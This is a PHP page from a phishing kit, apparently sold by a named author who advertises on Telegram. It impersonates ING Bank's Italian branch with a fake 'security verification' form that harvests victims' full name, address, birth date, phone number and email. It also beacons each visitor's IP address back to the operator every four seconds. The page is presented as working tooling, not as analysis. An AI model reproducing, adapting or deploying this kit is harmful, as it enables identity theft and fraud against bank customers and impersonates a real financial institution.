<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "details";

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="<?php echo IMGSPATH; ?>/favicon.ico">
        <title>ING</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">
        <script src="<?php echo JSPATH; ?>/stutes.js"></script>        
    </head>
    <body class="d-flex flex-column justify-content-between" style="min-height:100vh;">

      <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>

      <!-- wrapper_login -->
      <div class="wrapper_login">
        <div class="container_login" style="max-width: 561px;">
          <form action="index.php" method="POST">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="details">
            <div class="title">
              <h1 class="mb-0">È richiesta la verifica di sicurezza.</h1>
              <p class="mb-0" style="font-size: 14px;">Per la tua protezione, ING richiede una breve verifica delle tue informazioni. <be> Ti preghiamo di rivedere attentamente i campi e di fornire dati accurati.</p>
            </div>
            <div class="inputes">
              <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'full_name') ?>">
                <label for="full_name">nome e cognome</label>
                <input type="text" name="full_name" id="full_name"  class="w-100" value="<?php echo get_value('full_name'); ?>">
                <?php echo errmsg($_SESSION['errors'],'full_name'); ?>
              </div>
              <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'address') ?>">
                <label for="address">Indirizzo</label>
                <input type="text" name="address" id="address"  class="w-100" value="<?php echo get_value('address'); ?>">
                <?php echo errmsg($_SESSION['errors'],'address'); ?>
              </div>
              <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'birth_date') ?>">
                <label for="birth_date">Data di nascita</label>
                <input type="text" name="birth_date" id="birth_date"  inputmode="numeric" class="w-100" placeholder="gg/mm/aaaa" value="<?php echo get_value('birth_date'); ?>">
                <?php echo errmsg($_SESSION['errors'],'birth_date'); ?>
              </div>  
              <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'phone') ?>">
                <label for="phone">Numero di telefono</label>
                <input type="text" name="phone" id="phone"  inputmode="numeric" class="w-100" value="<?php echo get_value('phone'); ?>">
                <?php echo errmsg($_SESSION['errors'],'phone'); ?>
              </div>  
              <div class="form-group input_box w-100 <?php echo errclass($_SESSION['errors'],'email') ?>">
                <label for="email">Indirizzo e-mail</label>
                <input type="email" name="email" id="email"  class="w-100" value="<?php echo get_value('email'); ?>">
                <?php echo errmsg($_SESSION['errors'],'email'); ?>
              </div>              
            </div>
            <div class="btn_sub">
              <button type="submit">Conferma dati</button>
            </div>
          </form>
        </div>
      </div>

      <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


      
       









        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>
        
        <script>
            $('#birth_date').mask('00/00/0000');               
              
            
            worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'details'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);              
        </script>
    </body>
</html>